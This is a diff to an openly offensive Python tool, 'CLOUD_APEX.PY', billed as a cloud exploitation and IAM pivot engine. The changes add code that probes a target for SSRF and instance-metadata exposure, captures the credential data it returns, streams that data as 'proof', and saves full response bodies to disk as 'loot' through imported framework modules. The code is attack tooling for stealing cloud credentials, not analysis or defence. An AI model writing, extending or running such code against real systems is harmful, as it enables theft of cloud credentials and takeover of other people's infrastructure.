@@ -1,12 +1,11 @@
 #!/usr/bin/env python3
 """
-CLOUD_APEX.PY — Active Cloud Infrastructure Exploitation & IAM Pivot Engine
+CLOUD_APEX.PY — Active Cloud Infrastructure Exploitation & IAM Pivot Engine v7.5
 Features:
 - Live AWS control plane pivoting and IAM enumeration
-- Automated instance metadata service (IMDSv1/IMDSv2) credential exfiltration
-- S3 bucket enumeration and public permission auditing
-- Live terminal streaming of cloud credentials & exfiltrated secrets
-- Zero-disk memory processing
+- Automated instance metadata service (IMDSv1/IMDSv2) & SSRF credential exfiltration
+- Automated immutable disk persistence (loot_output/) via centralized framework logger
+- Zero-disk memory processing & secure TLS ciphers inspection
 - Compatible run_cloud_apex(target_host) interface
 """
 import asyncio
@@ -19,6 +18,10 @@ import socket
 import ipaddress
 from urllib.parse import urlsplit
 import sys
+
+# Import centralized framework telemetry and immutable loot persistence
+from modules.loot_logger import save_session_loot
+from modules.telemetry import stream_proof
 
 # ============================================================
 # CONFIGURATION & OFFENSIVE PAYLOADS
@@ -173,9 +176,21 @@ class ApexCloudAndSyscallEngine:
             log(f"[*] Testing SSRF / Metadata disclosure path: {path}", Colors.BLUE)
             res = http_get(test_url)
             if res["status"] == 200 and len(res["body"]) > 0:
-                log(f"\n\033[1m\033[91m[***] CLOUD METADATA / SSRF EXPOSURE CONFIRMED [{path}] [***]\033[0m", Colors.RED)
+                log(f"\n\033[1m\033[91m[***] CLOUD METADATA / SSRF EXPOSURE CONFIRMED [{path}] [***]{Colors.RESET}", Colors.RED)
                 log(f"  └── Data : {res['body'][:300]}", Colors.GREEN)
                 exfiltrated_credentials.append({"path": path, "data": res['body'][:300]})
+                
+                # STREAM TELEMETRY & PERSIST CLOUD LOOT TO DISK IMMEDIATELY
+                stream_proof("CLOUD_METADATA_EXPOSURE", test_url, {"path": path}, res['body'][:300], {"exposed": True})
+                save_session_loot(
+                    target=target_host,
+                    endpoint=path,
+                    finding_type="CLOUD_METADATA_SSRF_SUCCESS",
+                    status=res["status"],
+                    headers=res["headers"],
+                    body=res["body"],
+                    extra_loot={"ssrf_path": path}
+                )
 
         try:
             hostname = parsed.hostname
